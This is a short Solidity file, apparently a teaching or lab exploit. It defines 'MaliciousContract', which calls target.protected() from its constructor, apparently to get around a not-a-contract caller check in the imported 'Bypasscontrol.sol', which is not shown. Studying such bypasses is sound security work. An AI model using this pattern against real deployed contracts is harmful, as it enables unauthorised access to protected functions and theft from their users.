// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Bypasscontrol.sol";

contract MaliciousContract {
    Target public target;

    constructor(Target _target) {
        target = _target;
        target.protected();
    }
}